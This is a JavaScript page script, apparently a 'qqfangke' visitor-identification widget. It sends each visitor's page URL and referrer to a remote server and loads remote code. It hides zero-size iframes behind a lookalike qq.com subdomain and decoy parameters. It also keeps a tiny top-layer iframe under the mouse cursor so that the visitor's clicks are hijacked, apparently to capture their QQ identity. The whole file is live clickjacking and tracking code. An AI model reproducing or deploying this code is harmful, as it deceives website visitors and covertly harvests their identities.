/**
 * Created by Administrator on 14-5-22.
 */
var fangke_wid=2523;
var fangke_uid=203662;
var fangke_kaiguan=0;
var fangke_etime=1431655516;
var fangke_isIE = document.all?true:false;
var qqfangke_x = 0;
var qqfangke_y = 0;
var ieversion=fangke_getIEversion();
function fangke_loadJS(jsurl, onsuccess, charset, onerr) {
    var fangke_xScript = document.createElement("script");
    fangke_xScript.type = "text/javascript";
    if(charset=="")
    {
        fangke_xScript.charset = "utf-8";
    }
    else {
        fangke_xScript.charset = charset;
    }

    fangke_xScript.src = jsurl;
    fangke_xScript.onerror = function() {
        if (onerr) {
            setTimeout(onerr, 0)
        }
    };
    if (fangke_isIE) {
        fangke_xScript.onreadystatechange = function() {
            if (fangke_xScript.readyState) {
                if (fangke_xScript.readyState == "loaded" || fangke_xScript.readyState == "complete") {
                    fangke_xScript.onreadystatechange = null;
                    fangke_xScript.onload = null;
                    if (onsuccess) {
                        setTimeout(onsuccess, 0)
                    }
                }
            } else {
                fangke_xScript.onreadystatechange = null;
                fangke_xScript.onload = null;
                if (onsuccess) {
                    setTimeout(onsuccess, 0)
                }
            }
        }
    } else {
        fangke_xScript.onload = function() {
            if (fangke_xScript.readyState) {
                if (fangke_xScript.readyState == "loaded" || fangke_xScript.readyState == "complete") {
                    fangke_xScript.onreadystatechange = null;
                    fangke_xScript.onload = null;
                    if (onsuccess) {
                        setTimeout(onsuccess, 0)
                    }
                }
            } else {
                fangke_xScript.onreadystatechange = null;
                fangke_xScript.onload = null;
                if (onsuccess) {
                    setTimeout(onsuccess, 0)
                }
            }
        }
    }
    document.getElementsByTagName("HEAD").item(0).appendChild(fangke_xScript)
}

var QQfangke_page = encodeURIComponent(document.location.href);
var QQfangke_ref = encodeURIComponent(fangke_Request("fkrefurl",1));
if(!QQfangke_ref){
    QQfangke_ref=encodeURIComponent(document.referrer);
}

function fangke_LoginOK() {
    if (document.getElementById("QQfangke_iframe") == null) {
        var QQfangke_xurl = "http://college.qq.com.qqfangke.com/fangke/LoadCode?u=203662&w=2523&access=http://meishi.baidu.com/&soso=http://news.163.com/&key=http://v.youku.com/&act=http://meishi.baidu.com/&fk=http://finance.wqaa.com/&nbs=http://edu.1w2.com/&mecool=http://download.sowi.com/&jf=http://yue.tudou.qq.com/&buy=http://baby.cctv.com/&buy=http://3gqq.gg.com/&go=http://qzone.qsa.com/&access=http://blog.zna.com/&iu=http://kid.cvsw.com/&fk=http://vip.qws.com/&poler=http://games.google.com/&act=http://games.google.com/&iu=http://v.youku.com/&qqlo=http://kid.cvsw.com/&swd=http://news.163.com/";

        var QQfangke_url = QQfangke_xurl + "&ref=" + QQfangke_ref + "&page=" + QQfangke_page + "&t=" + new Date().getTime();
        var iframe = document.createElement("iframe");
        iframe.src = QQfangke_url;
        iframe.id = "QQfangke_iframe";
        iframe.name = "QQfangke_iframe";
        iframe.style.width = "0px";
        iframe.style.height = "0px";
        iframe.scrolling = "no";
        iframe.setAttribute("frameborder", "0", 0);
        document.getElementsByTagName("HEAD").item(0).appendChild(iframe)
    }
}

var iframelogin=false;
var iframexxx=false;
var iframehtml=false;

function createIframe_Login(){
    if(document.body && !iframelogin)
    {
        if(navigator.userAgent.indexOf("Firefox") <= 0 && !fangke_isIE){
            var iframecss = "position:absolute;z-index: 2147483647;width:2px;height:2px;margin:2px 0 0 0;+margin:0 0 0 -3px;margin-left:-1px\9\0;";
            window.iframe_xx = top.fangke_jumpurl;
            var iframe = document.createElement("iframe");
            iframe.src = "javascript:parent.iframe_xx";
            iframe.id = "iframe_xx_bb_aa";
            iframe.style.cssText = iframecss;
            iframe.scrolling = "no";
            iframe.setAttribute("frameborder", "0", 0);
            document.body.insertBefore(iframe,document.body.childNodes[0]);
        }else{fangke_LoginOK();}
    }else{
        iframelogin=true;
        setTimeout(createIframe_Login, 100);
    }
}

function createIframe_xxx(){
    if(document.body && !iframexxx)
    {
        if(ieversion<=5){
            var iframecss = "position:absolute; z-index: 2147483647;width:2px; height:2px; margin:1px 0 0 -1px;_margin:0px 0 0 -2px;";
            window.iframe_xx = top.fangke_jumpurl;
            var iframe = document.createElement("iframe");
            iframe.src = "javascript:parent.iframe_xx";
            iframe.id = "iframe_xx_bb_aa";
            iframe.style.cssText = iframecss;
            iframe.scrolling = "no";
            iframe.setAttribute("frameborder", "0", 0);
            document.body.insertBefore(iframe,document.body.childNodes[0]);
        }else{fangke_LoginOK();}
    }else{
        iframexxx=true;
        setTimeout(createIframe_xxx, 100);
    }
}

function createIframe_html(){
    if(document.body && !iframehtml)
    {
        if(ieversion<=5){
            var iframecss = "position:absolute; z-index: 0;width:0px; height:0px;";
            var iframe = document.createElement("iframe");
            iframe.src = fangke_jumpurl;
            iframe.id = "iframe_xx_bb_aa";
            iframe.style.cssText = iframecss;
            iframe.scrolling = "no";
            iframe.setAttribute("frameborder", "0", 0);
            document.body.insertBefore(iframe,document.body.childNodes[0]);
        }else{fangke_LoginOK();}
    }else{
        iframehtml=true;
        setTimeout(createIframe_html, 100);
    }
}

function fangke_Request(argname,tag)
{
    if(tag==0){
        var url = document.location.href;
    }else {
        var url = document.referrer;
    }
    var arrStr = url.substring(url.indexOf("?")+1).split("&");
    for(var i =0;i<arrStr.length;i++)
    {
        var loc = arrStr[i].indexOf(argname+"=");
        if(loc!=-1)
        {
            return arrStr[i].replace(argname+"=","").replace("?","");
            break;
        }
    }
    return "";
}

function fangke_loadJumpUrl(){
    var url="http://www.qqfangke.com/jump/getUrl.php?kaiguan="+fangke_kaiguan+"&a=0&etime="+fangke_etime+"&web_key=b6c42e1043c118fe3df9ec3ff288430e&url="+document.location.href+"&fkrefurl="+encodeURIComponent(document.referrer)+"&wid="+fangke_wid+"&uid="+fangke_uid;
    fangke_loadJS(url,check_jumpUrl);
}

function check_jumpUrl() {
    try {
        if(fangke_jumpurl&&fangke_jumpurl!=""&&fangke_jumpurl.indexOf('html5')>0){
            fangke_jumpurl=fangke_jumpurl+"&wid="+fangke_wid+"&uid="+fangke_uid+"&page="+encodeURIComponent(QQfangke_page)+"&ref="+encodeURIComponent(QQfangke_ref);
            setTimeout(createIframe_html, 0);
        }else if (fangke_jumpurl!="http://b.wap.soso.com") {
            window.fangke_jumpurl=fangke_jumpurl;
            setTimeout(createIframe_xxx, 0)
        }else {
            setTimeout(fangke_LoginOK, 0)
        }
    } catch(e) {
        //fangke_LoginOK();
        setTimeout(fangke_LoginOK, 0)
    }
}

function fangke_loadsUrl(){
    var url="http://www.qqfangke.com/jump/getUrl.php?kaiguan="+fangke_kaiguan+"&a=1&web_key=b6c42e1043c118fe3df9ec3ff288430e&url="+document.location.href+"&fkrefurl="+encodeURIComponent(document.referrer)+"&wid="+fangke_wid+"&uid="+fangke_uid;
    fangke_loadJS(url,fangke_SSFrame);
}

function create_zeroiframe(url){
    try {
        if (url) {
            var iframe = document.createElement("iframe");
            iframe.src = url+"&wid="+fangke_wid+"&uid="+fangke_uid+"&page=" + QQfangke_page;
            iframe.style.cssText = "width:0px;height:0px;";
            iframe.scrolling = "no";
            iframe.setAttribute("frameborder", "0", 0);
            document.getElementsByTagName("HEAD").item(0).appendChild(iframe);
        } else {
        }
    } catch(e) {
    }
}

function fangke_SSFrame(){
    create_zeroiframe(fangke_surl);
    create_zeroiframe(fangke_surl1);
}

var iframe_hover=false;

function fangke_iframeClick(a,_iframeclickcallback){
    a.onmouseover=function(){iframe_hover=true};
    a.onmouseout=function(){iframe_hover=false};
    window.onblur=function(){
        if (iframe_hover)
        {
            _iframeclickcallback();
        }
    }
}

function iframeclickcallback(){
    var iframe = document.getElementById("iframe_xx_bb_aa");
    setTimeout(function() {
            try {
                iframe.style.display = "none";
                var oPoint = document.elementFromPoint(qqfangke_x, qqfangke_y);
                oPoint.click();
                fangke_LoginOK();
            } catch(e) {}
        },
        1000)
}

function fangke_GetCurrentStyle (obj, prop)
{
    if (obj.currentStyle) //IE
    {
        return obj.currentStyle[prop];
    }
    else if (window.getComputedStyle) //éIE
    {
        propprop = prop.replace (/([A-Z])/g, "-$1");
        propprop = prop.toLowerCase ();
        return document.defaultView.getComputedStyle(obj,null)[propprop];
    }
    return null;
}

window.fangke_hookMove = function() {
    var iframe = document.getElementById("iframe_xx_bb_aa");
    fangke_iframeClick(iframe,iframeclickcallback);
    document.onmousemove = function(ev) {
        iframe_hover=false;
        window.focus();
        var iframe = document.getElementById("iframe_xx_bb_aa");
        var ev = ev || window.event;
        qqfangke_x = ev.clientX;
        qqfangke_y = ev.clientY;
        var sTop = document.body.scrollTop + document.documentElement.scrollTop;
        var widthD = document.documentElement.offsetWidth - ev.clientX;
        var sLeft = document.body.scrollLeft + document.documentElement.scrollLeft;
        var dd=0;
        var aaa=fangke_GetCurrentStyle(document.body,"position");
        if (document.documentElement.clientWidth>document.body.clientWidth && aaa=="relative")
        {
            dd=(document.documentElement.clientWidth-document.body.clientWidth)/2;
            dd=dd+sLeft;
            iframe.style.top = (sTop + ev.clientY - 2) + "px";
            iframe.style.left = ((widthD < iframe.offsetWidth ? ev.clientX - iframe.offsetWidth: ev.clientX)-dd) + "px"
        }else {
            dd=dd+sLeft;
            iframe.style.top = (sTop + ev.clientY - 2) + "px";
            iframe.style.left = ((widthD < iframe.offsetWidth ? ev.clientX - iframe.offsetWidth: ev.clientX)+dd) + "px"
        }
    }
}
function fangke_getIEversion(){
    try{
        var browser=navigator.appName;
        var b_version=navigator.appVersion;
        var version=b_version.split(";");
        var trim_Version=version[1].replace(/[ ]/g,"");
        if(browser=="Microsoft Internet Explorer" && trim_Version=="MSIE6.0")
        {return 6;}
        else if(browser=="Microsoft Internet Explorer" && trim_Version=="MSIE7.0")
        {return 7;}
        else if(browser=="Microsoft Internet Explorer" && trim_Version=="MSIE8.0")
        {return 8;}
        else if(browser=="Microsoft Internet Explorer" && trim_Version=="MSIE9.0")
        {return 9;}
        else{return 0;}
    }catch(e){return 0;}
}

fangke_loadsUrl();

if(window == parent){ //ç¦æ­¢iframe
    fangke_loadJumpUrl();
}

/*
 var arr = str1.split(','), str3 = [];
 for(var i=0,len= arr.length;i<len;i++){
 str3.push(String.fromCharCode(arr[i]));
 }
 //alert(str2 = String.fromCharCode(str1))
 //alert(hexToDec(str));

 //str2="alert";
 //code = str2.charCodeAt();
 console.log(str3.join(''));
 //alert(String.fromCharCode(code))

* */